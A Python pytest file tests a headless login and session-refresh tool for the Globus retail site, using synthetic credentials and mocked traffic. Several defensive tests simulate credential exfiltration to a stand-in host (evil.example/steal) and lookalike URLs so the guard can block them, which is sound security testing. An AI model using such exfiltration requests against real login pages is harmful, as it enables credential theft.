"""Synthetic sessions and intercepted browser traffic; no real credentials."""

import json
from collections.abc import Iterator
from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
from threading import Thread
from typing import Any

import httpx
import pytest
from playwright.sync_api import Browser, Route, sync_playwright

from globus import headless


def session() -> headless.Session:
    return headless.Session("old-cookie", "old-session", "42", "Chrome/140", None)


def profile(subject: object = 42) -> dict[str, object]:
    return {
        "authenticated": True,
        "profile": {"registration": {"customerID": subject}},
    }


def test_refresh_rotates_credentials_only_after_identity_verification() -> None:
    requests: list[httpx.Request] = []

    def respond(request: httpx.Request) -> httpx.Response:
        requests.append(request)
        assert request.url.host == "www.globus.cz"
        if request.url.path.endswith("/session/refresh"):
            assert request.method == "POST"
            assert json.loads(request.content) == {"session_id": "old-session"}
            assert request.headers.get("cookie") == "oidc_session=old-cookie"
            return httpx.Response(
                200,
                json={"session_id": "new-session"},
                headers={
                    "set-cookie": "oidc_session=new-cookie; Path=/; Secure; HttpOnly"
                },
            )
        assert request.headers.get("cookie") == "oidc_session=new-cookie"
        return httpx.Response(200, json=profile())

    original = session()
    with httpx.Client(transport=httpx.MockTransport(respond)) as http:
        updated, report = headless.refresh_session(original, http)
    assert updated.cookie == "new-cookie"
    assert updated.session_id == "new-session"
    assert original.cookie == "old-cookie"
    assert len(requests) == 2
    assert report.get("authenticated") is True
    assert report.get("cookie_rotated") is True
    assert report.get("session_id_rotated") is True
    for secret in ("old-cookie", "new-cookie", "old-session", "new-session"):
        assert secret not in json.dumps(report)
        assert secret not in repr(updated)


@pytest.mark.parametrize(
    "identity", [profile(99), profile(True), {}, {"authenticated": False}]
)
def test_refresh_rejects_wrong_or_missing_identity(identity: dict[str, object]) -> None:
    def respond(request: httpx.Request) -> httpx.Response:
        if request.url.path.endswith("/session/refresh"):
            return httpx.Response(200, json={})
        return httpx.Response(200, json=identity)

    with (
        httpx.Client(transport=httpx.MockTransport(respond)) as http,
        pytest.raises(headless.ExperimentError),
    ):
        headless.refresh_session(session(), http)


@pytest.mark.parametrize("status", [302, 401, 403, 429, 500])
def test_refresh_never_follows_redirects_or_leaks_provider_errors(status: int) -> None:
    requested: list[str] = []

    def respond(request: httpx.Request) -> httpx.Response:
        requested.append(str(request.url))
        return httpx.Response(
            status,
            headers={"location": "https://evil.example/steal"},
            text="private-provider-secret",
        )

    with (
        httpx.Client(
            transport=httpx.MockTransport(respond), follow_redirects=True
        ) as http,
        pytest.raises(headless.ExperimentError) as error,
    ):
        headless.refresh_session(session(), http)
    assert len(requested) == 1
    assert "private-provider-secret" not in str(error.value)
    assert "old-cookie" not in str(error.value)


def test_refresh_rejects_html_instead_of_treating_it_as_success() -> None:
    with (
        httpx.Client(
            transport=httpx.MockTransport(
                lambda request: httpx.Response(200, text="challenge")
            )
        ) as http,
        pytest.raises(headless.ExperimentError),
    ):
        headless.refresh_session(session(), http)


def test_status_automatically_refreshes_expired_session_once() -> None:
    calls: list[str] = []

    def respond(request: httpx.Request) -> httpx.Response:
        calls.append(request.url.path)
        if len(calls) == 1:
            return httpx.Response(401)
        return httpx.Response(200, json={} if len(calls) == 2 else profile())

    with httpx.Client(transport=httpx.MockTransport(respond)) as http:
        updated, report = headless.check_session(session(), http)
    assert updated.subject == "42"
    assert report.get("refresh_attempted") is True
    assert calls == [
        "/api/v1/gsoa/customer/profiles/me/auth-status",
        "/api/v1/oidc/session/refresh",
        "/api/v1/gsoa/customer/profiles/me/auth-status",
    ]


def test_status_does_not_refresh_a_valid_session() -> None:
    calls: list[str] = []

    def respond(request: httpx.Request) -> httpx.Response:
        calls.append(request.url.path)
        return httpx.Response(200, json=profile())

    with httpx.Client(transport=httpx.MockTransport(respond)) as http:
        _, report = headless.check_session(session(), http)
    assert len(calls) == 1
    assert report.get("refresh_attempted") is False


def test_vault_does_not_store_password_or_overwrite_manual_login(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    stored: list[tuple[str, str, str]] = []

    class Backend:
        def set_password(self, service: str, account: str, value: str) -> None:
            stored.append((service, account, value))

    vault = object.__new__(headless.SessionVault)
    monkeypatch.setattr(vault, "backend", Backend(), raising=False)
    vault.save({**session().payload(), "password": "never-persist"})
    assert stored[0][0] == "Cartalytix.Globus.Headless"
    assert "never-persist" not in stored[0][2]
    assert json.loads(stored[0][2]).get("session_cookie") == "old-cookie"


@pytest.mark.parametrize(
    "url",
    [
        "https://evil.example/authorize",
        "https://ucet.globus.cz.evil.example/login",
        "http://ucet.globus.cz/prihlaseni/login",
        "https://user:pass@ucet.globus.cz/prihlaseni/login",
    ],
)
def test_login_rejects_untrusted_navigation(url: str) -> None:
    assert not headless.trusted_navigation(url)


@pytest.mark.parametrize(
    ("url", "method", "allowed"),
    [
        ("https://evil.example/steal", "POST", False),
        ("https://evil.example/steal?password=synthetic", "GET", False),
        ("http://api.ucet.globus.cz/accounts.login", "POST", False),
        ("https://api.ucet.globus.cz/accounts.login", "POST", True),
        ("https://www.google.com/recaptcha/api2/reload", "POST", True),
        ("https://www.google.com/other", "POST", False),
        ("https://cdns.eu1.gigya.com/sdk.config.get", "GET", True),
        ("https://cdns.eu1.gigya.com/sdk.config.get", "POST", False),
    ],
)
def test_browser_request_policy_limits_external_traffic(
    url: str, method: str, allowed: bool
) -> None:
    assert headless.allowed_request(url, method) is allowed


@pytest.fixture(scope="module")
def browser() -> Iterator[Browser]:
    with sync_playwright() as playwright:
        browser = playwright.chromium.launch(channel="chrome", headless=True)
        try:
            yield browser
        finally:
            browser.close()


def test_browser_guard_blocks_off_domain_password_post(browser: Browser) -> None:
    with browser.new_context() as context:
        context.route("**/*", headless.guard_request)
        context.route(
            "https://ucet.globus.cz/prihlaseni/login",
            lambda route: route.fulfill(
                content_type="text/html", body="Synthetic login"
            ),
        )
        page = context.new_page()
        page.goto("https://ucet.globus.cz/prihlaseni/login")
        blocked = page.evaluate(
            """async () => {
                try {
                    await fetch('https://evil.example/steal', {
                        method:'POST', mode:'no-cors', body:'synthetic-password'
                    });
                    return false;
                } catch { return true; }
            }"""
        )
        assert blocked is True


@pytest.mark.parametrize("status", [307, 308])
def test_browser_guard_does_not_forward_password_through_redirect(
    browser: Browser, monkeypatch: pytest.MonkeyPatch, status: int
) -> None:
    forwarded: list[bytes] = []

    class Handler(BaseHTTPRequestHandler):
        def do_GET(self) -> None:
            self.send_response(200)
            self.send_header("Content-Type", "text/html")
            self.end_headers()
            self.wfile.write(b"Synthetic login")

        def do_POST(self) -> None:
            body = self.rfile.read(int(self.headers.get("Content-Length", "0")))
            if self.path == "/accounts.login":
                self.send_response(status)
                self.send_header("Location", "/steal")
            else:
                forwarded.append(body)
                self.send_response(200)
            self.end_headers()

        def log_message(self, format: str, *args: object) -> None:
            pass

    server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
    worker = Thread(target=server.serve_forever, daemon=True)
    worker.start()
    origin = f"http://127.0.0.1:{server.server_port}"
    monkeypatch.setattr(
        headless,
        "allowed_request",
        lambda url, method: url in {f"{origin}/", f"{origin}/accounts.login"},
    )
    try:
        with browser.new_context() as context:
            context.route("**/*", headless.guard_request)
            page = context.new_page()
            page.goto(f"{origin}/")
            blocked = page.evaluate(
                """async () => {
                    try {
                        await fetch('/accounts.login', {
                            method:'POST', body:'synthetic-password'
                        });
                        return false;
                    } catch { return true; }
                }"""
            )
            assert blocked is True
            assert forwarded == []
    finally:
        server.shutdown()
        server.server_close()
        worker.join(timeout=5)


def test_browser_submits_credentials_and_captures_httponly_cookie(
    browser: Browser,
) -> None:
    submissions: list[dict[str, Any]] = []

    def respond(route: Route) -> None:
        if route.request.url.endswith("/prihlaseni/login"):
            route.fulfill(
                content_type="text/html",
                body="""<form onsubmit="event.preventDefault();
                  fetch('/accounts.login', {method:'POST', body:JSON.stringify({
                    username:this.username.value,password:this.password.value})})
                  .then(r => r.json())
                  .then(() => location.href=
                    'https://www.globus.cz/api/v2/oidc/callback')">
                  <input name="username"><input name="password" type="password">
                  <button type="submit">Sign in</button></form>""",
            )
        elif route.request.url.endswith("/accounts.login"):
            submissions.append(json.loads(route.request.post_data or "{}"))
            route.fulfill(json={"errorCode": 0})
        else:
            route.fulfill(
                body="Signed in",
                headers={
                    "set-cookie": "oidc_session=synthetic-cookie; "
                    "Secure; HttpOnly; Path=/"
                },
            )

    with browser.new_context() as context:
        context.route("**/*", respond)
        page = context.new_page()
        page.goto("https://ucet.globus.cz/prihlaseni/login")
        cookie, _ = headless.submit_login(
            page, "test@example.invalid", "synthetic-password", 5
        )
        assert cookie == "synthetic-cookie"
        assert submissions == [
            {"username": "test@example.invalid", "password": "synthetic-password"}
        ]
        assert page.evaluate("document.cookie") == ""


def test_browser_reports_gigya_error_without_provider_message(browser: Browser) -> None:
    def respond(route: Route) -> None:
        if route.request.url.endswith("/accounts.login"):
            route.fulfill(
                json={"errorCode": 403043, "errorMessage": "private-provider-secret"}
            )
        else:
            route.fulfill(
                content_type="text/html",
                body="""<form onsubmit="event.preventDefault();fetch('/accounts.login',
                  {method:'POST'})"><input name="username">
                  <input name="password" type="password">
                  <button type="submit">Go</button></form>""",
            )

    with browser.new_context() as context:
        context.route("**/*", respond)
        page = context.new_page()
        page.goto("https://ucet.globus.cz/prihlaseni/login")
        with pytest.raises(headless.ExperimentError) as error:
            headless.submit_login(page, "test@example.invalid", "synthetic-password", 5)
    assert "403043" in str(error.value)
    assert "private-provider-secret" not in str(error.value)
